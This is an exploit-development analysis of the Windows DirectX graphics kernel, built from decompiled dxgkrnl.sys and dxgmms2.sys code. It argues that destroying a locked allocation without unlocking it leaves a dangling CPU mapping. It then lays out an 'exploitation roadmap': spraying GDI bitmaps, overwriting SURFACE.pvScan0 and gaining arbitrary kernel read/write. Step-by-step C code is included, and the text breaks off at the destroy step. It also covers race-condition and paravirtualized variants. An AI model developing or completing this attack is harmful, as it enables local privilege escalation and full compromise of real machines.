# DirectX Graphics Kernel Destroy Path Analysis — H3 Dangling Lock Mapping Viability

## 1. Executive Summary

**MODE 2 (Sequential Dangling Lock Mapping) IS VIABLE** for non-paravirtualized GPUs (physical NVIDIA/AMD/Intel) with lock type 5 (non-CPU-visible allocations — the most common type).

### The Bug

The D3DKMTLock path stores the CPU VA pointer at `multi_alloc+0x10` (VIDMM_MULTI_ALLOC structure). The destroy path's `CloseOneAllocation` checks `VIDMM_ALLOC+0x90` — a **different field in a different structure** — for the CPU VA to unmap. For lock type 5, `VIDMM_ALLOC+0x90` is never set, so `CloseOneAllocation` skips the unmap entirely. The CPU VA at `multi_alloc+0x10` is only unmapped by `D3DKMTUnlock` (`VIDMM_GLOBAL::Unlock`), which we deliberately never call.

**Result**: Calling `D3DKMTDestroyAllocation` without `D3DKMTUnlock` leaves the CPU VA PTE mapping dangling. The backing physical pages are freed by VidMm and can be reclaimed by GDI bitmap SURFACE objects. Writing to `pData + 0x50` corrupts `SURFACE.pvScan0`, enabling `GetBitmapBits`/`SetBitmapBits` as a 200M+ ops/sec arbitrary kernel R/W primitive.

### Key Evidence

| Check | Location | Field | Value (type 5) | Unmaps? |
|-------|----------|-------|----------------|---------|
| CloseOneAllocation CPU VA | VIDMM_ALLOC+0x90 | a2[6].Header.Lock | NULL | NO |
| CloseOneAllocation VA range list | VIDMM_ALLOC+0x80 | a2[5].WaitListHead | Empty | NO |
| DestroyOneAllocation system space | global_alloc+0x168 | *(PVOID*)(a3+45*8) | NULL | NO |
| DestroyOneAllocation host addresses | global_alloc+0x208 | *(void**)(a3+65*8) | NULL (non-vGPU) | NO |
| DestroyOneAllocation section deref | global_alloc+0x160 | VidMmDereferenceObjectAsync | Async, only for paravirtualized | DELAYED |
| **VIDMM_GLOBAL::Unlock** | **multi_alloc+0x10** | **v2[2]** | **CPU VA** | **YES — but never called** |

The only code path that unmaps `multi_alloc+0x10` is `VIDMM_GLOBAL::Unlock` (D3DKMTUnlock). The destroy path never calls it.

---

## 2. ValidateDestroyAllocation Analysis (0x1C0113700, dxgkrnl.sys)

### Function Signature

```c
__int64 ValidateDestroyAllocation(
    struct _KTHREAD **a1,    // process handle table
    struct DXGDEVICE *a2,    // device
    unsigned int a3,         // resource handle (non-zero = destroying resource)
    const unsigned int *a4,  // allocation handle array
    unsigned int a5,         // allocation count
    struct DXGALLOCATION **a6,  // output: resolved allocation objects
    struct DXGRESOURCE **a7      // output: resolved resource object
)
```

### Key Behavior

**Does NOT check for outstanding locks.** The function validates handle ownership and device association, but never inspects the VidMm lock count.

### Rundown Protection Drain Pattern

For individual allocations (a5 != 0, no resource):

```c
// LABEL_68 loop — for each allocation:
v56 = *v28;  // DXGALLOCATION pointer

// Acquire rundown protection (alloc+0x58)
DXGALLOCATIONREFERENCE::DXGALLOCATIONREFERENCE(v74, v56);
DXGALLOCATIONREFERENCE::MoveAssign(&v80, v74);
DXGALLOCATIONREFERENCE::~DXGALLOCATIONREFERENCE(v74);  // releases rundown

// Release and wait
DXGALLOCATIONREFERENCE::DXGALLOCATIONREFERENCE(v75, nullptr);  // null = release
DXGALLOCATIONREFERENCE::MoveAssign(&v80, v75);
DXGALLOCATIONREFERENCE::~DXGALLOCATIONREFERENCE(v75);

DxgkUnreferenceDxgAllocation(v57);

// CRITICAL: Wait for all rundown protection to be released
ExWaitForRundownProtectionRelease(v57 + 11);  // v57 + 11*8 = alloc+0x58

// Re-initialize and re-acquire
ExInitializeRundownProtection(v57 + 11);  // alloc+0x58
DxgkReferenceDxgAllocation(v57);
DXGALLOCATIONREFERENCE::DXGALLOCATIONREFERENCE(v76, v57);
```

**Key insight**: `ExWaitForRundownProtectionRelease` at `alloc+0x58` blocks if any DXGALLOCATIONREFERENCE holds rundown protection. However, the D3DKMTLock path creates a **local** DXGALLOCATIONREFERENCE that is destroyed when the lock function returns — rundown protection is NOT held persistently after D3DKMTLock returns.

**Therefore**: `ValidateDestroyAllocation` does NOT block when destroying a locked allocation. The rundown protection was already released when D3DKMTLock returned.

### Q2 Answer: Does ValidateDestroyAllocation check for outstanding locks?

**NO.** It does not check the VidMm lock count. It only drains rundown protection (which is not held after Lock returns). It does not reject destruction of locked allocations.

---

## 3. DXGDEVICE::TerminateAllocations Analysis (0x1C01150E0, dxgkrnl.sys)

### Function Signature

```c
void DXGDEVICE::TerminateAllocations(
    DXGDEVICE *this,
    struct DXGRESOURCE *a2,       // resource (non-zero = destroying resource)
    unsigned int a3,              // resource handle
    struct DXGALLOCATION *a4,     // allocation list
    struct COREDEVICEACCESS *a5,  // core device access
    struct _D3DDDICB_DESTROYALLOCATION2FLAGS a6  // destroy flags
)
```

### Path Selection

```c
v8 = (*(_BYTE *)&a6.0 & 2) == 0;  // true when AssumeNotLast flag NOT set
v13 = *((_DWORD *)this + 108) == 2;  // true when device type == 2

if ( !v8 || v13 || (!(_DWORD)v9 || !*((_QWORD *)a2 + 3)) && a2 )
    goto LABEL_45;  // SLOW PATH
```

For normal D3DKMTDestroyAllocation:
- `a6.0 & 2` (AssumeNotLast) is NOT set -> `v8 = true` -> **always goes to LABEL_45 (slow path)**

The fast path (termination tracker with `VidMmTerminateAllocation` at +152/0x98) is only taken when `AssumeNotLast` IS set AND device type != 2 AND there are allocations. This is an uncommon case.

### Slow Path (LABEL_45)

```c
LABEL_45:
    if ( a3 )
        DXGDEVICE::DestroyResource(v11, a2, a5, a6);   // resource destroy
    else
        DXGDEVICE::DestroyAllocations(v11, a2, 0, a4, a5, a6);  // allocation destroy
```

### Pre-destroy Loop (before path selection)

For each allocation, before the destroy path is selected:

```c
// Calls VidMm function at +632 (0x278) — prepare/pre-destroy
v18 = (*(... + 632LL))(VidMmCtx, internalHandle, 0, v9);
v92 += v18;

// Calls VidMm function at +648 (0x288) — count/size
v95 += (*(... + 648LL))(VidMmCtx, internalHandle);

// Calls VidMm function at +608 (0x260) — check (only for device type 2)
if ( v13 && (*(... + 608LL))(VidMmCtx, internalHandle) )
    v13 = 0;
```

These functions do NOT check for outstanding CPU VA locks.

### Allocation Loop (fast path with termination tracker)

```c
// For each allocation in the termination tracker:
ExWaitForRundownProtectionRelease((PEX_RUNDOWN_REF)(v66 + 88));  // alloc+0x58

// If allocation has display primary (v66+24):
if ( *(_QWORD *)(v66 + 24) )
{
    // Call VidMm TerminateAllocation at +152 (0x98)
    (*(... + 152LL))(VidMmCtx, *(QWORD*)(v66+24), segmentIndex, flags, terminationTracker);
}
```

The `VidMmTerminateAllocation` function (at +152/0x98) DOES wait for outstanding locks:
```c
while ( *((_DWORD *)a2 + 40) )  // wait while lock count > 0
    KeWaitForSingleObject(a2 + 21, ...);  // wait for lock event
```

But this path is only taken in the fast path (termination tracker), which requires `AssumeNotLast` flag to be set. **Normal D3DKMTDestroyAllocation takes the slow path and does NOT call VidMmTerminateAllocation.**

### Q4 Answer: Does TerminateAllocations wait for rundown protection release?

**In the slow path (normal case): NO.** It calls `ExWaitForRundownProtectionRelease(alloc+0x58)` in the allocation loop, but since D3DKMTLock releases rundown protection when it returns, this does not block.

**In the fast path (termination tracker): YES, indirectly.** `VidMmTerminateAllocation` waits for the lock count to reach zero. But this path is not taken for normal destroy calls.

---

## 4. DXGDEVICE::DestroyAllocations Analysis (0x1C0135644, dxgkrnl.sys)

### Critical Code Path

For each allocation in the list:

```c
// 1. If flag 0x800 set: call VidMm cleanup at +240 (0xF0)
if ( *((_QWORD *)v19 + 3) && (*((_DWORD *)v19 + 18) & 0x800) != 0 )
{
    (*(... + 240LL))(VidMmCtx);
    *((_DWORD *)v19 + 18) &= ~0x800u;
}

// 2. Free allocation handle and wait for zero references
ADAPTER_RENDER::FreeAllocationHandleAndWaitForZeroReferences(v27, v19, v8);

// 3. Call VidMm CloseAllocation at +176 (0xB0)
v32 = *((_QWORD *)v19 + 3);  // internal allocation handle
if ( v32 )
{
    Object = nullptr;
    v33 = (*(... + 176LL))(VidMmCtx, v32, &Object, a6.Value);
    if ( v33 < 0 )
    {
        // Error path: flush then destroy
        (*(... + 616LL))(VidMmCtx, internalHandle, 0, 4);  // flush
        (*(... + 168LL))(VidMmCtx, internalHandle, 0, a6.Value);  // destroy
    }
    *((_QWORD *)v19 + 3) = 0;  // clear internal handle
}

// 4. DdiCloseAllocation (KMD callback)
// 5. DdiDestroyAllocation (KMD callback)

// 6. Free DXGALLOCATION
DXGALLOCATION::~DXGALLOCATION(v66);
ExFreePoolWithTag(v66, 0);
```

### VidMm Function Pointer Table Offsets

| Offset (dec) | Offset (hex) | Function | Called From |
|--------------|--------------|----------|-------------|
| 136 | 0x88 | Unknown cleanup | DestroyAllocations (shared resource) |
| 152 | 0x98 | VidMmTerminateAllocation | TerminateAllocations (fast path) |
| 168 | 0xA8 | VidMmDestroyAllocation | DestroyAllocations (error path) |
| **176** | **0xB0** | **VidMmCloseAllocation** | **DestroyAllocations (normal path)** |
| 240 | 0xF0 | Unknown cleanup (flag 0x800) | DestroyAllocations |
| 264 | 0x108 | VidMmLock | D3DKMTLock |
| 272 | 0x110 | VidMmUnlock | D3DKMTUnlock |
| 288 | 0x120 | Unknown (client destroy) | DestroyClientAllocations |
| 608 | 0x260 | Unknown check | TerminateAllocations (pre-destroy) |
| 616 | 0x268 | Unknown flush | DestroyAllocations (error path) |
| 632 | 0x278 | Unknown prepare | TerminateAllocations (pre-destroy) |
| 648 | 0x288 | Unknown count | TerminateAllocations (pre-destroy) |
| 816 | 0x330 | VidMmLock2 | D3DKMTLock2 |
| 824 | 0x338 | VidMmUnlock2 | D3DKMTUnlock2 |

### Q3 Answer: Does the destroy path call VidMm Unlock to unmap CPU VA?

**NO.** The destroy path calls `VidMmCloseAllocation` (+176/0xB0), which calls `VIDMM_GLOBAL::CloseAllocation` -> `CloseOneAllocation`. This function does NOT call `VIDMM_GLOBAL::Unlock` and does NOT unmap `multi_alloc+0x10`. It only checks `VIDMM_ALLOC+0x90` (which is null for lock type 5).

---

## 5. VidMm Destroy/Unlock Analysis (dxgmms2.sys)

### 5.1 VIDMM_GLOBAL::Lock (0x1C006B380) — D3DKMTLock Implementation

```c
// Acquire allocation pushlock
ExAcquirePushLockExclusiveEx(v12 + 472, 0);  // global_alloc+0x1D8

// Determine lock type
if ( !*((_DWORD *)v40 + 19) )  // if lock count == 0
{
    v42 = *(_DWORD *)(v41 + 80);  // global_alloc+0x50 (flags)
    LODWORD(v63) = 1;  // default type 1
    if ( (v42 & 0x80u) == 0 )  // NOT CPU visible
    {
        LODWORD(v63) = 5;  // TYPE 5: MmMapViewOfSection / driver callback
    }
    // ... type 3/4 for CPU visible with segment info ...
}

// Call LockInternal
v8 = VIDMM_GLOBAL::LockInternal(this, &v63, (struct VIDMM_ALLOC *)a2, a4, 0, nullptr, nullptr);

// Release pushlock
ExReleasePushLockExclusiveEx(v12 + 472, 0);
```

### 5.2 VIDMM_GLOBAL::LockInternal (0x1C006BEB0) — The Mapping Engine

#### Lock Type 5 — Non-CPU-visible (Most Common)

```c
if ( *(_DWORD *)a2 == 5 )
{
    v16 = **(_DWORD **)(v13 + 496);  // segment flags via global_alloc+0x1F0

    if ( (v16 & 0x20000000) != 0 )  // PARAVIRTUALIZED (virtual GPU, WARP)
    {
        // Map via MmMapViewOfSection
        CurrentProcess = PsGetCurrentProcess();
        LODWORD(v11) = MmMapViewOfSection(
            *(_QWORD *)(v13 + 352),   // section object at global_alloc+0x160
            CurrentProcess,
            v12 + 2,                   // OUTPUT: &multi_alloc+0x10 (CPU VA)
            0,
            *(_QWORD *)(v13 + 8),      // size
            &v28,                      // section offset
            v13 + 8,                   // size ptr
            2,                         // ViewShare
            0,
            ~((_WORD)v16 << 8) & 0x400 | 4u);
    }
    else  // NON-PARAVIRTUALIZED (physical GPU — NVIDIA, AMD, Intel)
    {
        // Driver callback to map CPU VA
        v18 = (*(__int64 (__fastcall **)(_QWORD, __int64, _QWORD))
               (**(_QWORD **)(v12[1] + 24) + 72LL))(  // interface+0x48
            *(_QWORD *)(v12[1] + 24),   // driver context
            v12[3],                      // internal allocation handle
            *(_QWORD *)(v13 + 8));       // size
        v12[2] = v18;  // STORE CPU VA at multi_alloc+0x10
    }
}
```

#### Post-Mapping (LABEL_20)

```c
// Increment lock counts
_InterlockedIncrement((volatile signed __int32 *)(v13 + 336));  // global_alloc+0x150
++*((_DWORD *)v12 + 19);  // multi_alloc+0x4C
*(_DWORD *)(v13 + 84) |= 0x20u;  // set "locked" flag at global_alloc+0x54

// Return CPU VA to caller
if ( (v15 & 0x4000) != 0 )
    v25 = *(void **)(v13 + 528);   // aperture VA at global_alloc+0x210
else if ( (v15 & 0x2000) != 0 )
    // paravirtualized: LockParavirtualizedAllocationOnHost
else if ( (v15 & 8) != 0 )
    v25 = *(void **)(v13 + 360);   // system space VA at global_alloc+0x168
else
    v25 = (void *)v12[2];           // multi_alloc+0x10 (TYPE 5 PATH)

*a4 = v25;  // RETURNED TO USER MODE as pData
```

**Critical observation**: For lock type 5, the CPU VA is stored at `multi_alloc+0x10` and returned to user mode. `VIDMM_ALLOC+0x90` is **NEVER SET** in this path.

### 5.3 VIDMM_GLOBAL::Unlock (0x1C006B220) — D3DKMTUnlock Implementation

```c
// Attach to VidMm process
VIDMM_PROCESS::SafeAttach(v19, &v18);

// Acquire pushlock
ExAcquirePushLockExclusiveEx(v5 + 472, 0);  // global_alloc+0x1D8

if ( *((_DWORD *)v2 + 19) )  // if lock count > 0 (multi_alloc+0x4C)
{
    if ( (*(_DWORD *)(v5 + 84) & 0x20) != 0 )  // if "locked" flag set
    {
        _InterlockedDecrement((volatile signed __int32 *)(v5 + 336));  // global_alloc+0x150

        if ( (*((_DWORD *)v2 + 19))-- == 1 )  // if LAST unlock
        {
            if ( (v9 & 0x40000) != 0 )  // segment flag: has CPU VA mapping
            {
                if ( (v9 & 0x20000000) != 0 )  // paravirtualized
                    MmUnmapViewOfSection(CurrentProcess, v2[2]);  // UNMAP multi_alloc+0x10
                else
                    // Driver callback at interface+80 (0x50) to unmap
                v2[2] = 0;  // CLEAR multi_alloc+0x10
            }
        }
    }
}

ExReleasePushLockExclusiveEx(v5 + 472, 0);
VIDMM_PROCESS::SafeDetach(v12, &v18);
```

**This is the ONLY path that unmaps `multi_alloc+0x10`.** The destroy path does not call this.

### 5.4 VIDMM_GLOBAL::CloseAllocation (0x1C006A770) — Called from DestroyAllocations

```c
__int64 VIDMM_GLOBAL::CloseAllocation(
    VIDMM_GLOBAL *this,
    struct _EX_RUNDOWN_REF *a2,  // multi_alloc
    char a3,                       // try mode (0=normal, 1=try)
    struct _VIDMM_LOCAL_ALLOC **a4,
    struct _D3DDDICB_DESTROYALLOCATION2FLAGS a5,
    struct _KEVENT **a6)
{
    // Wait for VidMm-level rundown protection
    ExWaitForRundownProtectionRelease(a2 + 29);  // multi_alloc + 29*8 = multi_alloc+0xE8

    // Acquire process lock
    // ...

    // Call CloseOneAllocation
    v12 = VIDMM_GLOBAL::CloseOneAllocation(this, (struct _KEVENT *)a2, a4, a3, a5, a6);
    // ...
}
```

**Note**: `ExWaitForRundownProtectionRelease(multi_alloc+0xE8)` waits for VidMm-level rundown protection. D3DKMTLock does NOT acquire this rundown protection, so this does NOT block.

### 5.5 VIDMM_GLOBAL::CloseOneAllocation (0x1C006A8D0) — The Actual Cleanup

Structure offsets (decompiler types `a2` as `KEVENT*`, sizeof(KEVENT)=0x18):

| Field | Offset | Access |
|-------|--------|--------|
| multi_alloc pointer | VIDMM_ALLOC+0x00 | `*(QWORD*)a2` |
| state/flags | VIDMM_ALLOC+0x20 | `a2[1].Header.WaitListHead.Flink` |
| termination event | VIDMM_ALLOC+0x48 | `a2[3]` (KeSetEvent/KeWaitForSingleObject) |
| VA range list | VIDMM_ALLOC+0x80 | `a2[5].Header.WaitListHead` |
| **CPU VA (unmap target)** | **VIDMM_ALLOC+0x90** | `a2[6].Header.Lock` |

#### CPU VA Unmap Code

```c
// Wait for termination event
KeWaitForSingleObject(&a2[3], Executive, 0, 0, nullptr);  // VIDMM_ALLOC+0x48

// Wait for paging engines
VIDMM_GLOBAL::xWaitForAllPagingEngines(...);

// *** CPU VA UNMAP ***
v19 = *(_QWORD *)&a2[6].Header.Lock;  // VIDMM_ALLOC+0x90
if ( v19 )
{
    // Only unmap if segment is paravirtualized (0x10000000) or swizzled (0x8)
    if ( (**(_DWORD **)(v12 + 496) & 0x10000008) != 0 )
        MmUnmapViewOfSection(**(_QWORD **)(*(_QWORD *)&a2->Header.Lock + 8LL), v19);
    *(_QWORD *)&a2[6].Header.Lock = 0;  // clear pointer
}
```

**For lock type 5**: `VIDMM_ALLOC+0x90` is NULL (never set by LockInternal type 5). The `if (v19)` check fails, and `MmUnmapViewOfSection` is **NEVER CALLED**.

#### VA Range List Free

```c
if ( a2[5].Header.WaitListHead.Flink != &a2[5].Header.WaitListHead )
{
    // VA range list at VIDMM_ALLOC+0x80 is non-empty
    VirtualAddressAllocator = VIDMM_PROCESS::GetVirtualAddressAllocator(...);
    CVirtualAddressAllocator::FreeAllocMappedVaRangeList(VirtualAddressAllocator, (struct VIDMM_ALLOC *)a2);
}
```

**For lock type 5**: The VA range list at `VIDMM_ALLOC+0x80` is empty (D3DKMTLock type 5 does not add to this list). The check fails, and `FreeAllocMappedVaRangeList` is **NEVER CALLED**.

#### Local Alloc Free

```c
if ( (*((_DWORD *)v25 + 9))-- == 1 )  // if ref count reaches zero
{
    // ...
    if ( v26 )  // if a3 == nullptr (called from DestroyOneAllocation)
    {
        *((_BYTE *)v25 + 32) |= 4u;
        operator delete(v25);  // FREE multi_alloc / VIDMM_LOCAL_ALLOC
    }
}
// ...
operator delete(a2);  // FREE VIDMM_ALLOC
```

The `multi_alloc` (VIDMM_LOCAL_ALLOC) structure is freed. This destroys the CPU VA pointer at `multi_alloc+0x10`, but the **PTE mapping in the process page table persists**.

### 5.6 VIDMM_GLOBAL::DestroyOneAllocation (0x1C0069DC0) — Global Alloc Destroy

```c
void VIDMM_GLOBAL::DestroyOneAllocation(
    VIDMM_GLOBAL *this,
    struct VIDMM_DEVICE *a2,
    struct _VIDMM_GLOBAL_ALLOC *a3,
    char a4)
{
    // 1. Remove from decommit list
    // 2. Queue system cleanup if needed
    // 3. Unlock backing store
    if ( (v17 & 2) != 0 )
    {
        VIDMM_SEGMENT::UnlockAllocationBackingStore(v7, a3, nullptr);
        VIDMM_GLOBAL::ReturnPinnedBackingStore(v7, *((_QWORD *)a3 + 1));
        *((_DWORD *)a3 + 21) &= ~2u;
    }

    // 4. Close allocation (attaches to owning process)
    KeStackAttachProcess(**(PRKPROCESS **)(v19 + 8), &ApcState);
    VIDMM_GLOBAL::CloseOneAllocation(v7, (struct VIDMM_ALLOC *)(v20 - 40), nullptr, 0, 0, nullptr);
    KeUnstackDetachProcess(&ApcState);

    // 5. Unmap host addresses from guest (virtual GPU only, flag 0x44000)
    if ( (v23 & 0x44000) == 0x44000 )
    {
        v24 = *((void **)a3 + 65);  // global_alloc+0x208
        if ( v24 )
            VIDMM_PROCESS::UnmapHostAddressesFromGuest(...);
    }

    // 6. Unmap system space view (flag 0x800000)
    if ( (v23 & 0x800000) != 0 )
    {
        MmUnmapViewInSystemSpace(*((PVOID *)a3 + 45));  // global_alloc+0x168
        *((_DWORD *)a3 + 20) &= ~0x800000u;
        *((_QWORD *)a3 + 45) = 0;
    }

    // 7. Dereference section object (async)
    VidMmDereferenceObjectAsync(*((PVOID *)a3 + 44));  // global_alloc+0x160
    *((_QWORD *)a3 + 44) = 0;

    // 8. Free global_alloc
    operator delete(*((void **)a3 + 62));  // segment alloc info
    _VIDMM_GLOBAL_ALLOC::~_VIDMM_GLOBAL_ALLOC(a3);
    operator delete(a3);
}
```

**Unmap checks in DestroyOneAllocation**:

| Check | Field | Condition | Type 5 Value | Unmaps? |
|-------|-------|-----------|--------------|---------|
| CloseOneAllocation | VIDMM_ALLOC+0x90 | if non-null | NULL | NO |
| CloseOneAllocation VA list | VIDMM_ALLOC+0x80 | if non-empty | Empty | NO |
| Host addresses | global_alloc+0x208 | flag 0x44000 | Not set (non-vGPU) | NO |
| System space | global_alloc+0x168 | flag 0x800000 | Not set (type 5) | NO |
| Section deref | global_alloc+0x160 | Always | Section obj (paravirtualized) or NULL | ASYNC |

### 5.7 VIDMM_GLOBAL::TerminateOneAllocation (0x1C0086F18) — Fast Path

```c
void VIDMM_GLOBAL::TerminateOneAllocation(...)
{
    // Mark as being terminated
    DXGFASTMUTEX::Acquire(*(DXGFASTMUTEX **)(v8 + 312));
    *((_DWORD *)a2 + 8) |= 1u;
    DXGFASTMUTEX::Release(*(DXGFASTMUTEX **)(v8 + 312));

    // Store termination tracker
    a2[24] = (__int64 *)a5;

    // *** WAIT FOR OUTSTANDING LOCKS ***
    while ( *((_DWORD *)a2 + 40) )  // VIDMM_ALLOC+0xA0 = lock count
        KeWaitForSingleObject(a2 + 21, ...);  // VIDMM_ALLOC+0x1F8 = lock event

    // Submit device command to GPU scheduler
    VidSchSubmitDeviceCommand(v14, v20);
}
```

**This function DOES wait for outstanding locks**, but it's only called from the fast path (termination tracker), which requires the `AssumeNotLast` flag to be set. Normal `D3DKMTDestroyAllocation` does NOT trigger this path.

### 5.8 VidMmiProbeAndLockAllocation (0x1C0062DAC) — NOT the D3DKMTLock Path

```c
// This is a DIFFERENT path used for probing/locking pages during allocation creation
// It maps temporarily, creates MDL, locks pages, then UNMAPS
v13 = VidMmMapViewOfAllocation(v8, a2, a3, v22, 0);  // map
Mdl = VidMmiAllocateMdl(v13, a3);                      // create MDL
MmProbeAndLockPages(Mdl, 0, a4);                       // lock pages
VidMmUnmapViewOfAllocation(v8, v22[0]);                // UNMAP immediately
return v12;  // return MDL (locked pages, no CPU VA mapping)
```

This function creates a temporary mapping to build an MDL, then unmaps it. It does NOT leave a persistent CPU VA mapping. This is NOT the D3DKMTLock path.

---

## 6. The Critical Answer: Does Destroy Unmap Outstanding CPU VA Locks?

### NO — For Non-Paravirtualized GPUs with Lock Type 5

**The destroy path does NOT unmap the CPU VA mapping stored at `multi_alloc+0x10`.**

Here is the complete trace:

```
D3DKMTDestroyAllocation
  -> DxgkDestroyAllocation (dxgkrnl.sys)
    -> DxgkDestroyAllocationHelper
      -> Acquires device lock (ERESOURCE/pushlock)
      -> DxgkDestroyAllocationInternal
        -> ValidateDestroyAllocation (0x1C0113700)
          -> Resolves allocation handles
          -> ExWaitForRundownProtectionRelease(alloc+0x58)
             [Does NOT block — D3DKMTLock released rundown when it returned]
          -> Re-initializes rundown protection
          -> Marks allocations with 0x2000 flag
        -> TerminateAllocations (0x1C01150E0)
          -> v8 = true (AssumeNotLast NOT set)
          -> Goto LABEL_45 (SLOW PATH)
          -> DestroyAllocations (0x1C0135644)
            -> For each allocation:
              -> FreeAllocationHandleAndWaitForZeroReferences
              -> VidMmCloseAllocation (+176/0xB0)
                -> VIDMM_GLOBAL::CloseAllocation (0x1C006A770, dxgmms2.sys)
                  -> ExWaitForRundownProtectionRelease(multi_alloc+0xE8)
                     [Does NOT block — Lock doesn't hold this]
                  -> CloseOneAllocation (0x1C006A8D0)
                    -> Signals termination event
                    -> Waits for event (returns immediately)
                    -> Waits for paging engines
                    -> CHECKS VIDMM_ALLOC+0x90: NULL (type 5 never sets it)
                       -> SKIPS MmUnmapViewOfSection *** GAP ***
                    -> CHECKS VA range list at VIDMM_ALLOC+0x80: EMPTY
                       -> SKIPS FreeAllocMappedVaRangeList *** GAP ***
                    -> Frees VIDMM_LOCAL_ALLOC (multi_alloc)
                       -> multi_alloc+0x10 (CPU VA pointer) is DESTROYED
                       -> But PTE mapping PERSISTS in process page table
                    -> Frees VIDMM_ALLOC
              -> Clears internal handle
            -> DdiCloseAllocation (KMD callback)
            -> DdiDestroyAllocation (KMD callback)
            -> DXGALLOCATION::~DXGALLOCATION
            -> ExFreePoolWithTag(DXGALLOCATION)
          -> DestroyOneAllocation (0x1C0069DC0) [via VidMmDestroyAllocation]
            -> UnlockAllocationBackingStore
            -> ReturnPinnedBackingStore [frees backing pages]
            -> CloseOneAllocation [already called above]
            -> UnmapHostAddressesFromGuest [virtual GPU only — SKIPPED]
            -> MmUnmapViewInSystemSpace [system space only — SKIPPED]
            -> VidMmDereferenceObjectAsync(global_alloc+0x160) [async section deref]
            -> Free VIDMM_GLOBAL_ALLOC
```

### The Two Critical Gaps

**Gap 1: CPU VA pointer mismatch**
- `LockInternal` type 5 stores CPU VA at `multi_alloc+0x10`
- `CloseOneAllocation` checks `VIDMM_ALLOC+0x90`
- These are different fields in different structures
- `VIDMM_ALLOC+0x90` is never set by type 5 lock
- `CloseOneAllocation` skips the unmap

**Gap 2: No explicit multi_alloc+0x10 unmap in destroy**
- `VIDMM_GLOBAL::Unlock` is the only function that unmaps `multi_alloc+0x10`
- The destroy path calls `CloseOneAllocation`, not `Unlock`
- `CloseOneAllocation` does not call `Unlock`
- The driver unmap callback (interface+0x50) is never invoked

### For Paravirtualized GPUs (Virtual Machines, WARP)

The CPU VA is mapped via `MmMapViewOfSection` using a section object at `global_alloc+0x160`. During destroy, `VidMmDereferenceObjectAsync` asynchronously dereferences this section. When the section's ref count reaches zero, the memory manager automatically unmaps all views. There is a **timing window** between the destroy and the async section cleanup where the mapping persists, but it is eventually cleaned up.

### For Non-Paravirtualized GPUs (Physical NVIDIA/AMD/Intel)

The CPU VA is mapped via a driver callback (interface+0x48). The destroy path does NOT call the corresponding driver unmap callback (interface+0x50). There is no section object to dereference. The mapping **persists indefinitely** until the process exits or the driver explicitly cleans it up.

---

## 7. Alternative Exploitation Angles

### 7.1 Mode 2 — Sequential Dangling Mapping (PRIMARY — VIABLE)

**Conditions**:
- Physical GPU (non-paravirtualized)
- Lock type 5 (non-CPU-visible allocation)
- D3DKMTLock -> D3DKMTDestroyAllocation (without D3DKMTUnlock)

**Flow**:
1. Create a D3D device and context
2. Create an allocation in a system memory segment (non-CPU-visible)
3. `D3DKMTLock` — maps CPU VA to backing pages, returns `pData`
4. `D3DKMTDestroyAllocation` — frees backing pages, does NOT unmap CPU VA
5. Spray GDI bitmaps — SURFACE objects reclaim freed physical pages
6. Write `pData + 0x50` — corrupts `SURFACE.pvScan0`
7. `GetBitmapBits`/`SetBitmapBits` — 200M+ kernel R/W ops/sec

**Reliability**: HIGH for physical GPUs. The mapping persists indefinitely.

### 7.2 Mode 2 — Paravirtualized Timing Window

**Conditions**:
- Virtual GPU (paravirtualized, WARP)
- Lock type 5
- Race between destroy and async section cleanup

**Flow**: Same as 7.1, but must spray bitmaps before `VidMmDereferenceObjectAsync` completes and the section is freed.

**Reliability**: MEDIUM. Requires precise timing or slowing down the async cleanup.

### 7.3 TOCTOU Race — Lock vs Destroy

If the sequential approach has issues, a concurrent race is possible:

**Thread 1**: `D3DKMTLock` — acquires pushlock at `global_alloc+0x1D8`, calls `LockInternal`, maps CPU VA
**Thread 2**: `D3DKMTDestroyAllocation` — acquires device lock, calls `CloseOneAllocation`

The locks are different:
- Lock uses: `global_alloc+0x1D8` pushlock
- CloseOneAllocation uses: `global_alloc+0x138` fast mutex and process pushlock

**Race window**: If Thread 2's `CloseOneAllocation` reads `VIDMM_ALLOC+0x90` (null) before Thread 1's `LockInternal` stores the CPU VA, then Thread 2 skips the unmap and frees the structures. Thread 1 then stores the CPU VA in the freed `multi_alloc`, creating a use-after-free with a dangling mapping.

**Reliability**: LOW. Requires extremely precise timing. The pushlock at `global_alloc+0x1D8` may serialize Lock and Destroy if they access the same allocation.

### 7.4 D3DKMTMapGpuVirtualAddress

`DxgkMapGpuVirtualAddress` (0x1C01598D0, dxgkrnl.sys) maps GPU virtual address space, not CPU VA. This is not useful for our CPU VA write primitive.

### 7.5 Lock Type 1 — CPU-Visible Allocations

For CPU-visible allocations (flag 0x80 at `global_alloc+0x50`), lock type 1 is used. The CPU VA comes from `global_alloc+0x168` (system space) or `global_alloc+0x210` (aperture), which ARE cleaned up by `DestroyOneAllocation` (via `MmUnmapViewInSystemSpace` for system space). **Not viable.**

### 7.6 Lock Type 3 — CPU Visible Segment

`LockAllocInCpuVisibleSegment` builds an MDL from the existing mapping and rotates pages. The CPU VA at `multi_alloc+0x10` is the pre-existing mapping. Destroy behavior would be the same as type 5 — `CloseOneAllocation` checks `VIDMM_ALLOC+0x90`, not `multi_alloc+0x10`. **Potentially viable** but requires a CPU-visible segment allocation.

---

## 8. Exploitation Roadmap for Mode 2

### Step 1: Create D3D Device and Context

```c
D3DKMT_CREATEDEVICE createDevice = {};
createDevice.Flags.GlobalSharedGdi = 0;
D3DKMTCreateDevice(&createDevice);
// createDevice.hDevice = device handle

D3DKMT_CREATECONTEXT createContext = {};
createContext.hDevice = createDevice.hDevice;
D3DKMTCreateContext(&createContext);
```

### Step 2: Create Allocation in System Memory Segment

```c
D3DDDI_ALLOCATIONINFO allocInfo = {};
allocInfo.pPrivateDriverData = ...;  // driver-specific
allocInfo.PrivateDriverDataSize = ...;
// Must target a non-CPU-visible system memory segment
// This ensures lock type 5 is used

D3DKMT_CREATEALLOCATION createAlloc = {};
createAlloc.hDevice = createDevice.hDevice;
createAlloc.NumAllocations = 1;
createAlloc.pAllocationInfo = &allocInfo;
D3DKMTCreateAllocation(&createAlloc);
// allocInfo.hAllocation = allocation handle
```

### Step 3: Lock the Allocation (Map CPU VA)

```c
D3DKMT_LOCK lock = {};
lock.hDevice = createDevice.hDevice;
lock.hAllocation = allocInfo.hAllocation;
lock.Flags.Lock = 1;
D3DKMTLock(&lock);
// lock.pData = CPU VA pointer (mapped to backing physical pages)
// This CPU VA is stored at multi_alloc+0x10 in VidMm
// The PTE in the process page table maps pData -> physical pages
```

### Step 4: Destroy the Allocation (Without Unlock)

```c
D3DKMT_DESTROYALLOCATION destroyAlloc = {};
